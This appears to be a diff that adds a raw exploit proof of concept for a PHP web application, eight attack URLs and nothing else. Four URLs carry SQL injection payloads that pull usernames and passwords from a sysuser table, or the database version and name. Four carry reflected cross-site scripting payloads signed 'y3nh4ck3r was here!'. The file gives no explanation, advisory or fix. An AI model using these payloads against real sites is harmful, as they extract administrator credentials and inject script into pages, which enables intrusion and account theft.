@@ -1,0 +1,16 @@
+http://www.example.com/[HOME_PATH]/modules/kategorie.php?Modus=Detail&amp;ID=1+and+0+union+all+select+1,SuUser,SuPwd+FROM+sysuser+WHERE+SuID=1%23
+
+http://www.example.com/[HOME_PATH]/modules/budget.php?Modus=Detail&amp;ID=5+AND+0+UNION+ALL+SELECT+1,SuUser,SuPwd,4,5,6,7,8+FROM+sysuser+WHERE+SuID=1/*
+
+http://www.example.com/[HOME_PATH]/modules/zahlung.php?Modus=Detail&amp;ID=1+AND+0+UNION+ALL+SELECT+1,version()/*&amp;Kontext=adresse
+
+http://www.example.com/[HOME_PATH]/modules/adresse.php?Modus=Detail&amp;ID=2+AND+0+UNION+ALL+SELECT+1,version(),database()%23&amp;Kontext=ereignis
+
+http://www.example.com/[HOME_PATH]/modules/ereignis.php?Modus=List&amp;Page=1&quot;&gt;&lt;script&gt;alert(&#039;y3nh4ck3r+was+here!&#039;)&lt;/script&gt;&amp;Order=ErAnfangsdatum
+
+http://www.example.com/[HOME_PATH]/modules/kategorie.php?Modus=Search&amp;Kontext=objekt&quot;&gt;&lt;script&gt;alert(&#039;y3nh4ck3r+was+here!&#039;)&lt;/script&gt;
+
+http://www.example.com/[HOME_PATH]/modules/image.php?image=&lt;script&gt;alert(&#039;y3nh4ck3r+was+here!&#039;)&lt;/script&gt;
+
+http://www.example.com/[HOME_PATH]/modules/sitzung.php?Modus=Detail&amp;ID=1&quot;&lt;script&gt;alert(&#039;y3nh4ck3r+was+here!&#039;)&lt;/script&gt;
+
